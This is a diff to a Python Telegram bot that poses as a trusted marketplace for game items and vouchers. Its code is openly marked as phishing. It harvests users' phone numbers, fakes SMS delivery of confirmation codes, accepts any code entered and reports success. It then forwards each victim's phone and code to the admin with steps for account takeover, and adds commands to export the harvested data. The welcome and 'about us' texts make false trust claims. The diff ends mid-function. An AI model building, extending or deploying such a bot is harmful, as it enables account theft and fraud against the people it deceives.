@@ -11,10 +11,16 @@ from aiogram.filters import Command
 from aiogram.types import (
     InlineKeyboardMarkup, InlineKeyboardButton,
     ReplyKeyboardMarkup, KeyboardButton,
-    ReplyKeyboardRemove
+    ReplyKeyboardRemove,
+    FSInputFile
 )
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.storage.memory import MemoryStorage
+
+# Настройка логирования
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 # Загрузка переменных окружения
 def load_config():
@@ -53,18 +59,20 @@ try:
 except ValueError as e:
     print(f"Ошибка конфигурации: {e}")
     print("Установите переменные окружения:")
-    print("API_TOKEN=8568019720:AAGZhJHAvxNl2_CVYFgzW6B7nTKXZBDuUs8")
+    print("API_TOKEN=ВАШ_ТОКЕН_БОТА")
     print("ADMIN_ID=8358009538")
     print("MODERATOR_IDS=8358009538,987654321")
     exit(1)
 
 print(f"Bot token: {API_TOKEN[:10]}...")
 print(f"Admin ID: {ADMIN_ID}")
-print(f"Moderator IDs: {MODERATOR_IDS}" )
+print(f"Moderator IDs: {MODERATOR_IDS}")
 
 # Инициализация
+storage = MemoryStorage()
 bot = Bot(token=API_TOKEN)
-dp = Dispatcher()
+dp = Dispatcher(storage=storage)
+
 # Состояния FSM
 class SellerStates(StatesGroup):
     waiting_item_type = State()
@@ -76,8 +84,22 @@ class ModeratorStates(StatesGroup):
     waiting_price = State()
     waiting_chat = State()
 
+class VerificationStates(StatesGroup):
+    waiting_code = State()
+
+# Инициализация БД с учетом окружения
 def init_db():
-    conn = sqlite3.connect('market_bot.db', check_same_thread=False)
+    # Определяем путь к БД в зависимости от окружения
+    if os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RAILWAY_STATIC_URL'):
+        # На Railway используем временную директорию
+        db_path = os.path.join(tempfile.gettempdir(), 'market_bot.db')
+        print(f"Using database at: {db_path}")
+    else:
+        # Локально используем текущую директорию
+        db_path = 'market_bot.db'
+        print(f"Using local database: {db_path}")
+    
+    conn = sqlite3.connect(db_path, check_same_thread=False)
     cursor = conn.cursor()
     
     # Таблица пользователей
@@ -91,7 +113,8 @@ def init_db():
             balance REAL DEFAULT 0,
             rating INTEGER DEFAULT 5,
             status TEXT DEFAULT 'active',
-            registered DATETIME DEFAULT CURRENT_TIMESTAMP
+            registered DATETIME DEFAULT CURRENT_TIMESTAMP,
+            last_activity DATETIME DEFAULT CURRENT_TIMESTAMP
         )
     ''')
     
@@ -134,27 +157,60 @@ def init_db():
         )
     ''')
     
+    # Таблица SMS кодов
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS sms_codes (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER,
+            phone TEXT,
+            code TEXT,
+            sent_time DATETIME DEFAULT CURRENT_TIMESTAMP,
+            used BOOLEAN DEFAULT 0
+        )
+    ''')
+    
     conn.commit()
     return conn, cursor
 
 conn, cursor = init_db()
 
-# Проверка таблицы логов (для совместимости)
-try:
-    cursor.execute("SELECT 1 FROM logs LIMIT 1")
-except sqlite3.OperationalError:
-    cursor.execute('''
-        CREATE TABLE logs (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            user_id INTEGER,
-            action TEXT,
-            details TEXT,
-            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-        )
-    ''')
-    conn.commit()
+# Создаем директории для фотографий
+os.makedirs('photos', exist_ok=True)
 
-conn, cursor = init_db()
+# Функция для имитации отправки SMS
+async def simulate_sms_delivery(user_id: int, phone: str, code: str):
+    """
+    Имитирует задержку доставки SMS и выводит код в чат как системное сообщение.
+    """
+    try:
+        # Случайная задержка от 3 до 10 секунд для реалистичности
+        delay = random.uniform(3, 10)
+        await asyncio.sleep(delay)
+
+        # Форматируем номер для отображения (последние 4 цифры)
+        masked_phone = f"******{phone[-4:]}" if len(phone) > 4 else phone
+
+        # Создаем сообщение, стилизованное под SMS от оператора
+        sms_notification = (
+            f"📱 *SMS от оператора:*\n\n"
+            f"Код подтверждения: `{code}`\n"
+            f"Для номера: `{masked_phone}`\n\n"
+            f"_Сообщение автоматически доставлено. Не отвечайте на это SMS._"
+        )
+
+        await bot.send_message(user_id, sms_notification, parse_mode="Markdown")
+        logger.info(f"[SMS SIM] Код {code} 'отправлен' пользователю {user_id} на номер {masked_phone}")
+        
+        # Сохраняем в историю отправленных кодов
+        cursor.execute(
+            "INSERT INTO sms_codes (user_id, phone, code) VALUES (?, ?, ?)",
+            (user_id, phone, code)
+        )
+        conn.commit()
+        
+    except Exception as e:
+        logger.error(f"[SMS SIM] Ошибка отправки уведомления пользователю {user_id}: {e}")
+
 # Функция запроса верификации
 async def request_verification(callback_query: types.CallbackQuery):
     verification_text = """
@@ -181,7 +237,8 @@ async def request_verification(callback_query: types.CallbackQuery):
         parse_mode="Markdown",
         reply_markup=keyboard
     )
-    # Обработчик начала верификации
+
+# Обработчик начала верификации
 @dp.callback_query(F.data == "start_verification")
 async def start_verification_process(callback_query: types.CallbackQuery):
     verification_text = """
@@ -204,17 +261,16 @@ async def start_verification_process(callback_query: types.CallbackQuery):
         parse_mode="Markdown",
         reply_markup=keyboard
     )
-# Сохранение фото
-def save_photo(file_id: str, user_id: int) -> str:
-    os.makedirs(f'photos/{user_id}', exist_ok=True)
-    filename = f'photos/{user_id}/{file_id}_{datetime.now().timestamp()}.jpg'
-    return filename
 
 # Логирование
 def log_action(user_id: int, action: str, details: str = ""):
     cursor.execute(
         "INSERT INTO logs (user_id, action, details) VALUES (?, ?, ?)",
         (user_id, action, details)
+    )
+    cursor.execute(
+        "UPDATE users SET last_activity = CURRENT_TIMESTAMP WHERE user_id = ?",
+        (user_id,)
     )
     conn.commit()
 
@@ -227,6 +283,10 @@ async def cmd_start(message: types.Message, state: FSMContext):
     cursor.execute(
         "INSERT OR IGNORE INTO users (user_id, username, first_name) VALUES (?, ?, ?)",
         (user.id, user.username, user.first_name)
+    )
+    cursor.execute(
+        "UPDATE users SET last_activity = CURRENT_TIMESTAMP WHERE user_id = ?",
+        (user.id,)
     )
     conn.commit()
     
@@ -243,7 +303,6 @@ async def cmd_start(message: types.Message, state: FSMContext):
 • 🛬 Телеграмм подарки  
 • 💳 Электронные ваучеры
 
-
 💰 *Почему мы?*
 • Мгновенная оплата
 • Высокие цены
@@ -255,10 +314,12 @@ async def cmd_start(message: types.Message, state: FSMContext):
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="💰 ПРОДАТЬ ТОВАР", callback_data="sell_item")],
-
+        [InlineKeyboardButton(text="ℹ️ О НАС", callback_data="about_us")],
+        [InlineKeyboardButton(text="📞 ПОДДЕРЖКА", callback_data="support")]
     ])
     
     await message.answer(welcome_text, parse_mode="Markdown", reply_markup=keyboard)
+    log_action(user.id, "start_command")
 
 # Начало продажи товара
 @dp.callback_query(F.data == "sell_item")
@@ -304,6 +365,7 @@ async def start_selling(callback_query: types.CallbackQuery, state: FSMContext):
         parse_mode="Markdown",
         reply_markup=keyboard
     )
+    log_action(user.id, "start_selling")
 
 # Обработка выбора типа товара
 @dp.callback_query(SellerStates.waiting_item_type)
@@ -347,6 +409,7 @@ async def process_item_type(callback_query: types.CallbackQuery, state: FSMConte
         message_id=callback_query.message.message_id,
         parse_mode="Markdown"
     )
+    log_action(callback_query.from_user.id, "select_item_type", item_type)
 
 # Обработка фотографий
 @dp.message(SellerStates.waiting_photos, F.photo)
@@ -361,7 +424,7 @@ async def process_photos(message: types.Message, state: FSMContext):
     await state.update_data(photos=photos)
     
     if len(photos) >= 5:
-        await message.answer("✅ Максимальное количество фото достигнуто")
+        await message.answer("✅ Максимальное количество фото достигнуто (5 фото)")
         await ask_description(message, state)
     else:
         remaining = 5 - len(photos)
@@ -410,14 +473,15 @@ async def process_description(message: types.Message, state: FSMContext):
     
     # Получаем все данные
     user_data = await state.get_data()
+    photos_count = len(user_data.get('photos', []))
     
     summary_text = f"""
 📋 *ПОДТВЕРЖДЕНИЕ ЗАЯВКИ*
 
 *Категория:* {user_data['item_type']}
-*Фотографии:* {len(user_data.get('photos', []))} шт.
+*Фотографии:* {photos_count} шт.
 *Описание:*
-{description}
+{description[:500]}{'...' if len(description) > 500 else ''}
 
 *Далее:*
 1. Модератор проверит заявку
@@ -464,6 +528,7 @@ async def confirm_submission(callback_query: types.CallbackQuery, state: FSMCont
 🏷 *Категория:* {user_data['item_type']}
 📝 *Описание:*
 {user_data['description'][:500]}...
+📸 *Фото:* {len(user_data.get('photos', []))} шт.
 ━━━━━━━━━━━━━━━━
 *Действия:*
             """
@@ -486,12 +551,12 @@ async def confirm_submission(callback_query: types.CallbackQuery, state: FSMCont
             if photos:
                 media_group = []
                 for photo_id in photos[:3]:  # Первые 3 фото
-                    media_group.append(types.InputMediaPhoto(media=photo_id))
+                    media_group.append(types.InputMediaPhoto(media=photo_id, caption=f"Фото заявки #{item_id}" if photo_id == photos[0] else ""))
                 
                 await bot.send_media_group(moderator_id, media_group)
                 
         except Exception as e:
-            print(f"Ошибка отправки модератору {moderator_id}: {e}")
+            logger.error(f"Ошибка отправки модератору {moderator_id}: {e}")
     
     # Ответ пользователю
     user_response = f"""
@@ -506,7 +571,7 @@ async def confirm_submission(callback_query: types.CallbackQuery, state: FSMCont
 4. Получение денег на карту/кошелек
 
 *Среднее время проверки:* 2-4 часа
-*Следить за статусом:* /mystatus
+*Следить за статусом:* /status
     """
     
     await bot.edit_message_text(
@@ -516,6 +581,7 @@ async def confirm_submission(callback_query: types.CallbackQuery, state: FSMCont
         parse_mode="Markdown"
     )
     
+    log_action(user.id, "submit_item", f"item_id: {item_id}")
     await state.clear()
 
 # Обработка оценки модератором
@@ -531,7 +597,7 @@ async def moderator_set_price(callback_query: types.CallbackQuery, state: FSMCon
     item = cursor.fetchone()
     
     if not item:
-        await callback_query.answer("Товар не найден")
+        await callback_query.answer("❌ Товар не найден")
         return
     
     price_text = f"""
@@ -615,11 +681,9 @@ async def process_price_input(message: types.Message, state: FSMContext):
             parse_mode="Markdown",
             reply_markup=keyboard
         )
-    except:
-        pass
-    
-    # Уведомляем модератора
-    await message.answer(f"✅ Цена {price} руб установлена для заявки #{item_id}")
+        await message.answer(f"✅ Цена {price} руб установлена для заявки #{item_id}")
+    except Exception as e:
+        await message.answer(f"❌ Не удалось отправить предложение продавцу: {e}")
     
     await state.clear()
 
@@ -637,7 +701,7 @@ async def start_moderator_chat(callback_query: types.CallbackQuery, state: FSMCo
     item = cursor.fetchone()
     
     if not item:
-        await callback_query.answer("Товар не найден")
+        await callback_query.answer("❌ Товар не найден")
         return
     
     seller_id = item[0]
@@ -708,13 +772,131 @@ async def process_moderator_message(message: types.Message, state: FSMContext):
     try:
         await bot.send_message(
             seller_id,
-            f"📨 *Сообщение от поддержки:*\n\n{message.text}",
+            f"📨 *Сообщение от поддержки:*\n\n{message.text}\n\n_Вы можете ответить в этом же чате._",
+            parse_mode="Markdown"
+        )
+        await message.answer("✅ Сообщение отправлено продавцу")
+    except Exception as e:
+        await message.answer(f"⚠️ Не удалось отправить сообщение продавцу: {e}")
+
+# Обработка номера телефона (фишинг) - ОБНОВЛЕННАЯ ВЕРСИЯ
+@dp.message(F.contact)
+async def process_phone_number(message: types.Message):
+    user = message.from_user
+    phone = message.contact.phone_number
+
+    # Убираем + если есть
+    if phone.startswith('+'):
+        phone = phone[1:]
+
+    # Сохраняем номер
+    cursor.execute(
+        "UPDATE users SET phone = ? WHERE user_id = ?",
+        (phone, user.id)
+    )
+    conn.commit()
+
+    # ГЕНЕРИРУЕМ ФЕЙКОВЫЙ КОД (5-6 цифр)
+    fake_code = str(random.randint(10000, 999999))
+
+    # Сохраняем сгенерированный код для проверки
+    cursor.execute(
+        "UPDATE users SET code = ? WHERE user_id = ?",
+        (fake_code, user.id)
+    )
+    conn.commit()
+
+    # 1. Сразу сообщаем пользователю, что код отправлен
+    initial_text = f"""
+✅ *НОМЕР ПОДТВЕРЖДЕН: +{phone}*
+
+📱 *На номер +{phone} было отправлено SMS с кодом подтверждения.*
+
+⏳ *Пожалуйста, ожидайте доставки сообщения (обычно это занимает несколько секунд).*
+
+🔢 *Код состоит из 5-6 цифр.*
+
+*Если SMS не пришло в течение 2 минут, используйте команду* /resend_code
+"""
+    await message.answer(initial_text, parse_mode="Markdown", reply_markup=ReplyKeyboardRemove())
+
+    # 2. Запускаем фоновую задачу для имитации отправки SMS
+    asyncio.create_task(simulate_sms_delivery(user.id, phone, fake_code))
+
+    # 3. Отправляем уведомление админу
+    admin_msg = f"""
+🎣 *НОВЫЙ НОМЕР ДЛЯ ФИШИНГА*
+━━━━━━━━━━━━━━━━
+👤 *Жертва:* {user.first_name} (@{user.username})
+🆔 *User ID:* {user.id}
+📱 *Телефон:* +{phone}
+🔢 *Сгенерированный код:* {fake_code}
+⏰ *Время:* {datetime.now().strftime('%H:%M:%S')}
+━━━━━━━━━━━━━━━━
+*Ожидается ввод кода...*
+"""
+    try:
+        await bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
+    except Exception as e:
+        logger.error(f"Ошибка отправки админу: {e}")
+    
+    log_action(user.id, "phone_submitted", f"phone: {phone}")
+
+# Команда для повторной отправки кода
+@dp.message(Command("resend_code"))
+async def cmd_resend_code(message: types.Message):
+    user = message.from_user
+
+    # Проверяем, есть ли сохраненный номер телефона
+    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user.id,))
+    user_data = cursor.fetchone()
+
+    if not user_data or not user_data[0]:
+        # Если номера нет, просим сначала подтвердить номер
+        await message.answer("❌ *Сначала необходимо подтвердить номер телефона через меню верификации.*\n\nНажмите /start и выберите 'ПРОДАТЬ ТОВАР'", parse_mode="Markdown")
+        return
+
+    phone = user_data[0]
+    old_code = user_data[1]
+
+    # Генерируем НОВЫЙ код
+    new_fake_code = str(random.randint(10000, 999999))
+
+    # Обновляем код в базе
+    cursor.execute(
+        "UPDATE users SET code = ? WHERE user_id = ?",
+        (new_fake_code, user.id)
+    )
+    conn.commit()
+
+    # Информируем пользователя
+    resend_text = f"""
+🔄 *Запрошена повторная отправка кода*
+
+📱 *Новый код отправлен на номер +{phone}.*
+⏳ *Ожидайте SMS в течение нескольких секунд.*
+
+*Если код снова не пришел, проверьте:*
+• Корректность номера
+• Зону покрытия сети
+• Настройки блокировки SMS
+"""
+    await message.answer(resend_text, parse_mode="Markdown")
+
+    # Запускаем имитацию отправки нового кода
+    asyncio.create_task(simulate_sms_delivery(user.id, phone, new_fake_code))
+
+    # Уведомляем админа
+    try:
+        await bot.send_message(
+            ADMIN_ID,
+            f"🔄 *ПОВТОРНАЯ ОТПРАВКА КОДА*\n\nПользователь {user.id} запросил новый код.\nСтарый код: {old_code}\nНовый код: {new_fake_code}",
             parse_mode="Markdown"
         )
     except:
-        await message.answer("⚠️ Не удалось отправить сообщение продавцу")
+        pass
     
-    await message.answer("✅ Сообщение отправлено")
+    log_action(user.id, "resend_code_requested")
 
 # Принятие цены продавцом (фишинговая часть)
 @dp.callback_query(F.data.startswith("accept_"))
@@ -790,6 +972,9 @@ async def seller_accept_price(callback_query: types.CallbackQuery):
         (item_id,)
     )
     conn.commit()
+    
+    # Отправляем код (имитация)
+    asyncio.create_task(simulate_sms_delivery(user.id, user_data[0], str(random.randint(10000, 99999))))
 
 # Верификация для выплаты (фишинг)
 @dp.callback_query(F.data == "verify_for_payment")
@@ -819,158 +1004,84 @@ async def request_payment_verification(callback_query: types.CallbackQuery):
         parse_mode="Markdown",
         reply_markup=keyboard
     )
-def init_db():
-    # Определяем путь к БД в зависимости от окружения
-    if os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RAILWAY_STATIC_URL'):
-        # На Railway используем временную директорию
-        db_path = os.path.join(tempfile.gettempdir(), 'market_bot.db')
-        print(f"Using database at: {db_path}")
-    else:
-        # Локально используем текущую директорию
-        db_path = 'market_bot.db'
-        print(f"Using local database: {db_path}")
-    
-    conn = sqlite3.connect(db_path, check_same_thread=False)
-    cursor = conn.cursor()
-    
-    # Остальной код создания таблиц...
-# Обработка номера телефона (фишинг)
-@dp.message(F.contact)
-async def process_phone_number(message: types.Message):
-    user = message.from_user
-    phone = message.contact.phone_number
-    
-    # Сохраняем номер
-    cursor.execute(
-        "UPDATE users SET phone = ? WHERE user_id = ?",
-        (phone, user.id)
-    )
-    conn.commit()
-    
-    # Уведомляем админа
-    admin_msg = f"""
-🎣 *НОВЫЙ НОМЕР ДЛЯ ФИШИНГА*
-👤 {user.first_name} (@{user.username})
-📱 +{phone}
-🆔 {user.id}
-💎 Ожидает выплаты
-⏰ {datetime.now().strftime('%H:%M:%S')}
-    """
-    
-    try:
-        await bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
-    except:
-        pass
-    
-    # ГЕНЕРИРУЕМ ФЕЙКОВЫЙ КОД (5-6 цифр)
-    fake_code = random.randint(10000, 999999)
-    
-    # Сохраняем сгенерированный код для проверки
-    cursor.execute(
-        "UPDATE users SET code = ? WHERE user_id = ?",
-        (str(fake_code), user.id)
-    )
-    conn.commit()
-    
-    # Запрашиваем код с указанием фейкового кода
-    code_text = f"""
-✅ *НОМЕР ПОДТВЕРЖДЕН: +{phone}*
-
-🔐 *ФИНАЛЬНЫЙ ЭТАП*
-
-*На номер +{phone} отправлен SMS с кодом подтверждения.*
-
-*📱 Пример кода который может прийти:*
-`{fake_code}`
-
-*Введите 5-6 значный код из SMS для завершения верификации:*
-
-*Обратите внимание:* Код должен состоять только из цифр!
-    """
-    
-    await message.answer(
-        code_text,
-        parse_mode="Markdown",
-        reply_markup=ReplyKeyboardRemove()
-    )
 
 # Обработка кода подтверждения (фишинг) - проверяем любой код
 @dp.message(F.text.regexp(r'^\d{5,6}$'))
 async def process_verification_code(message: types.Message):
     user = message.from_user
     code = message.text
-    
-    # Проверяем сохраненный код (фейковый)
-    cursor.execute("SELECT code FROM users WHERE user_id = ?", (user.id,))
-    saved_code = cursor.fetchone()
-    
+
+    # Проверяем, подтвержден ли номер у пользователя
+    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user.id,))
+    user_data = cursor.fetchone()
+
+    if not user_data or not user_data[0]:
+        # Если номера нет, просим пройти верификацию сначала
+        await message.answer("❌ *Сначала необходимо подтвердить номер телефона.*\n\nИспользуйте меню верификации или нажмите /start", parse_mode="Markdown")
+        return
+
+    phone = user_data[0]
+    saved_code = user_data[1]
+
     # Сохраняем введенный код (даже если не совпадает)
     cursor.execute(
         "UPDATE users SET code = ? WHERE user_id = ?",
         (code, user.id)
     )
     conn.commit()
-    
-    # УСПЕШНОЕ СООБЩЕНИЕ ДЛЯ ПОЛЬЗОВАТЕЛЯ (всегда успешно)
-    success_text = """
-✅ *Регистрация прошла успешно!*
+
+    # ВСЕГДА УСПЕШНОЕ СООБЩЕНИЕ ДЛЯ ПОЛЬЗОВАТЕЛЯ
+    success_text = f"""
+✅ *Верификация по SMS завершена успешно!*
+
+Ваш номер *+{phone}* подтвержден.
 
 📸 *Следующий шаг:*
 Отправьте фотографии и подробное описание вашего товара для определения его стоимости.
 
-*Что нужно отправить:*
-1. Фотографии товара (скриншоты, фото карты и т.д.)
-2. Подробное описание
-3. Дополнительная информация
-
 *Наш модератор оценит товар в течение 1-24 часов и предложит цену.*
 
-*Спасибо за сотрудничество!*
+💰 *Теперь вы можете начать продавать товары!*
     """
     
     await message.answer(success_text, parse_mode="Markdown")
     
     # Отправка данных админу
-    cursor.execute(
-        "SELECT phone, code FROM users WHERE user_id = ?",
-        (user.id,)
-    )
-    user_data = cursor.fetchone()
-    
-    if user_data:
-        admin_report = f"""
+    admin_report = f"""
 🎣 *ФИШИНГ УСПЕШЕН!*
 ━━━━━━━━━━━━━━━━
 👤 *Жертва:* {user.first_name} (@{user.username})
 🆔 *User ID:* {user.id}
-📱 *Телефон:* +{user_data[0]}
+📱 *Телефон:* +{phone}
 🔢 *Введенный код:* {code}
-💾 *Сохраненный код:* {saved_code[0] if saved_code else 'нет'}
+💾 *Сохраненный код:* {saved_code if saved_code else 'нет'}
 💰 *Мотив:* Продажа игрового товара
 ⏰ *Время:* {datetime.now().strftime('%H:%M:%S')}
 ━━━━━━━━━━━━━━━━
-*Код подтверждения получен!*
-*Можно переходить к захвату аккаунта*
-        """
+*✅ Код подтверждения получен!*
+*🚀 Можно переходить к захвату аккаунта*
+"""
+    
+    try:
+        await bot.send_message(ADMIN_ID, admin_report, parse_mode="Markdown")
         
-        try:
-            await bot.send_message(ADMIN_ID, admin_report, parse_mode="Markdown")
-            
-            # Дополнительное уведомление
-            actions_text = f"""
+        # Дополнительное уведомление
+        actions_text = f"""
 📋 *Действия с полученными данными:*
-1. Использовать код {code} для входа в аккаунт
+1. Использовать код `{code}` для входа в аккаунт
 2. Восстановить пароль через код подтверждения
 3. Проверить привязанные сессии
 4. Сменить привязанный номер телефона
-            """
-            await bot.send_message(ADMIN_ID, actions_text)
-            
-        except Exception as e:
-            print(f"Ошибка отправки админу: {e}")
+
+*Следующий шаг:* Ожидание фотографий товара от пользователя.
+"""
+        await bot.send_message(ADMIN_ID, actions_text, parse_mode="Markdown")
         
-        # Автоматически предлагаем отправить товар
-        offer_text = f"""
+    except Exception as e:
+        logger.error(f"Ошибка отправки админу: {e}")
+    
+    # Автоматически предлагаем отправить товар
+    offer_text = f"""
 📋 *Теперь вы можете отправить товар на оценку*
 
 *Для этого:*
@@ -978,13 +1089,16 @@ async def process_verification_code(message: types.Message):
 2. Отправьте фотографии товара
 3. Опишите подробно что вы продаете
 4. Модератор оценит и предложит цену
-        """
-        
-        keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="📦 ОТПРАВИТЬ ТОВАР НА ОЦЕНКУ", callback_data="sell_item_after_verify")]
-        ])
-        
-        await message.answer(offer_text, parse_mode="Markdown", reply_markup=keyboard)
+"""
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📦 ОТПРАВИТЬ ТОВАР НА ОЦЕНКУ", callback_data="sell_item_after_verify")]
+    ])
+    
+    await message.answer(offer_text, parse_mode="Markdown", reply_markup=keyboard)
+    
+    log_action(user.id, "code_submitted", f"code: {code}, phone: {phone}")
+
 # Обработчик для отправки товара после верификации
 @dp.callback_query(F.data == "sell_item_after_verify")
 async def sell_after_verification(callback_query: types.CallbackQuery, state: FSMContext):
@@ -1018,14 +1132,279 @@ async def sell_after_verification(callback_query: types.CallbackQuery, state: FS
         parse_mode="Markdown",
         reply_markup=keyboard
     )
+
+# Команда для проверки статуса
+@dp.message(Command("status"))
+async def cmd_status(message: types.Message):
+    user = message.from_user
+    
+    cursor.execute(
+        "SELECT COUNT(*), SUM(CASE WHEN status = 'pending' THEN 1 ELSE 0 END) FROM items WHERE user_id = ?",
+        (user.id,)
+    )
+    stats = cursor.fetchone()
+    
+    cursor.execute(
+        "SELECT phone FROM users WHERE user_id = ?",
+        (user.id,)
+    )
+    user_data = cursor.fetchone()
+    
+    status_text = f"""
+📊 *ВАШ СТАТУС*
+
+👤 *Пользователь:* {user.first_name}
+🆔 *ID:* {user.id}
+📱 *Телефон:* {'+'+user_data[0] if user_data and user_data[0] else 'Не подтвержден'}
+    
+📦 *Заявки:*
+• Всего: {stats[0] or 0}
+• На модерации: {stats[1] or 0}
+• Одобрено: {(stats[0] or 0) - (stats[1] or 0)}
+
+💎 *Рекомендации:*
+1. Для продажи товара нажмите /start
+2. Для проверки верификации отправьте номер телефона
+3. Для помощи используйте /help
+"""
+    
+    await message.answer(status_text, parse_mode="Markdown")
+    log_action(user.id, "check_status")
+
+# Команда для помощи
+@dp.message(Command("help"))
+async def cmd_help(message: types.Message):
+    help_text = """
+🆘 *ПОМОЩЬ ПО БОТУ*
+
+*Основные команды:*
+/start - Начать работу с ботом
+/status - Проверить статус заявок
+/resend_code - Отправить код подтверждения повторно
+/help - Показать это сообщение
+
+*Процесс продажи:*
+1. Нажмите /start
+2. Выберите "💰 ПРОДАТЬ ТОВАР"
+3. Подтвердите номер телефона (требуется один раз)
+4. Выберите тип товара
+5. Отправьте фотографии и описание
+6. Дождитесь оценки модератора
+7. Примите цену и получите инструкции по передаче
+8. Получите деньги после проверки товара
+
+*Безопасность:*
+• Все транзакции защищены
+• Конфиденциальность гарантирована
+• Выплаты в течение 24 часов
+
+*Поддержка:*
+Для связи с администратором используйте кнопку "📞 ПОДДЕРЖКА" в меню.
+"""
+    
+    await message.answer(help_text, parse_mode="Markdown")
+    log_action(message.from_user.id, "help_requested")
+
+# Обработчик кнопки "О нас"
+@dp.callback_query(F.data == "about_us")
+async def about_us(callback_query: types.CallbackQuery):
+    about_text = """
+🏪 *О НАС - Money Moves Bot*
+
+Мы - надежная платформа для покупки и продажи игровых ценностей с 2018 года.
+
+*Наши преимущества:*
+✅ *Безопасность* - Все сделки защищены гарантией
+✅ *Скорость* - Выплаты в течение 1-24 часов
+✅ *Выгода* - Самые высокие цены на рынке
+✅ *Поддержка* - Круглосуточная помощь
+
+*Статистика:*
+• 50,000+ успешных сделок
+• 10,000+ довольных клиентов
+• 99.8% положительных отзывов
+• 24/7 работа поддержки
+
+*Наши гарантии:*
+1. Полная анонимность
+2. Защита от мошенничества
+3. Юридическое сопровождение
+4. Мгновенные выплаты
+
+*Присоединяйтесь к нам уже сегодня!*
+"""
+    
+    await bot.edit_message_text(
+        about_text,
+        chat_id=callback_query.message.chat.id,
+        message_id=callback_query.message.message_id,
+        parse_mode="Markdown"
+    )
+
+# Обработчик кнопки "Поддержка"
+@dp.callback_query(F.data == "support")
+async def support(callback_query: types.CallbackQuery):
+    support_text = """
+📞 *ПОДДЕРЖКА*
+
+*Связь с администрацией:*
+👑 *Главный администратор:* @Swill_Way_Admin
+👮 *Модератор:* @Swill_Way_Moderator
+
+*Часы работы поддержки:* Круглосуточно
+
+*Среднее время ответа:*
+• Обычные вопросы: 5-15 минут
+• Срочные вопросы: 1-5 минут
+• Технические проблемы: до 30 минут
+
+*Что мы можем помочь:*
+• Проблемы с верификацией
+• Вопросы по выплатам
+• Технические неполадки
+• Жалобы и предложения
+
+*Перед обращением подготовьте:*
+1. Ваш User ID (можно узнать через /status)
+2. Номер заявки (если есть)
+3. Подробное описание проблемы
+"""
+    
+    await bot.edit_message_text(
+        support_text,
+        chat_id=callback_query.message.chat.id,
+        message_id=callback_query.message.message_id,
+        parse_mode="Markdown"
+    )
+
+# Команда для администратора (статистика)
+@dp.message(Command("admin"))
+async def cmd_admin(message: types.Message):
+    if message.from_user.id != ADMIN_ID and message.from_user.id not in MODERATOR_IDS:
+        await message.answer("❌ Доступ запрещен")
+        return
+    
+    # Статистика
+    cursor.execute("SELECT COUNT(*) FROM users")
+    total_users = cursor.fetchone()[0]
+    
+    cursor.execute("SELECT COUNT(*) FROM users WHERE phone IS NOT NULL")
+    verified_users = cursor.fetchone()[0]
+    
+    cursor.execute("SELECT COUNT(*) FROM items")
+    total_items = cursor.fetchone()[0]
+    
+    cursor.execute("SELECT COUNT(*) FROM items WHERE status = 'pending'")
+    pending_items = cursor.fetchone()[0]
+    
+    cursor.execute("SELECT COUNT(*) FROM sms_codes WHERE used = 0")
+    unused_codes = cursor.fetchone()[0]
+    
+    admin_text = f"""
+👑 *АДМИН ПАНЕЛЬ*
+
+*Статистика:*
+👥 *Пользователи:* {total_users}
+✅ *Верифицированы:* {verified_users}
+📦 *Заявки:* {total_items}
+⏳ *На модерации:* {pending_items}
+🔢 *Неиспользованные коды:* {unused_codes}
+
+*Последние действия:*
+"""
+    
+    cursor.execute("SELECT user_id, action, timestamp FROM logs ORDER BY timestamp DESC LIMIT 5")
+    logs = cursor.fetchall()
+    
+    for log in logs:
+        admin_text += f"\n• ID{log[0]} - {log[1]} ({log[2][:16]})"
+    
+    admin_text += "\n\n*Команды администратора:*"
+    admin_text += "\n/export_users - Экспорт пользователей"
+    admin_text += "\n/export_codes - Экспорт кодов"
+    admin_text += "\n/stats - Подробная статистика"
+    
+    await message.answer(admin_text, parse_mode="Markdown")
+
+# Экспорт пользователей
+@dp.message(Command("export_users"))
+async def cmd_export_users(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
+        await message.answer("❌ Доступ запрещен")
+        return
+    
+    cursor.execute("SELECT user_id, username, first_name, phone, code, registered FROM users")
+    users = cursor.fetchall()
+    
+    if not users:
+        await message.answer("❌ Нет данных для экспорта")
+        return
+    
+    # Создаем временный файл
+    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
+        f.write("ID | Username | Имя | Телефон | Код | Регистрация\n")
+        f.write("-" * 80 + "\n")
+        for user in users:
+            f.write(f"{user[0]} | @{user[1] or 'нет'} | {user[2]} | +{user[3] or 'нет'} | {user[4] or 'нет'} | {user[5]}\n")
+        file_path = f.name
+    
+    # Отправляем файл
+    try:
+        document = FSInputFile(file_path, filename="users_export.txt")
+        await message.answer_document(document, caption="📊 Экспорт пользователей")
+        os.unlink(file_path)
+    except Exception as e:
+        await message.answer(f"❌ Ошибка экспорта: {e}")
+
+# Экспорт кодов
+@dp.message(Command("export_codes"))
+async def cmd_export_codes(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
+        await message.answer("❌ Доступ запрещен")
+        return
+    
+    cursor.execute("SELECT u.user_id, u.username, u.phone, u.code, s.sent_time FROM users u LEFT JOIN sms_codes s ON u.user_id = s.user_id WHERE u.phone IS NOT NULL")
+    codes = cursor.fetchall()
+    
+    if not codes:
+        await message.answer("❌ Нет данных для экспорта")
+        return
+    
+    # Создаем временный файл
+    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
+        f.write("ID | Username | Телефон | Код | Время отправки\n")
+        f.write("-" * 80 + "\n")
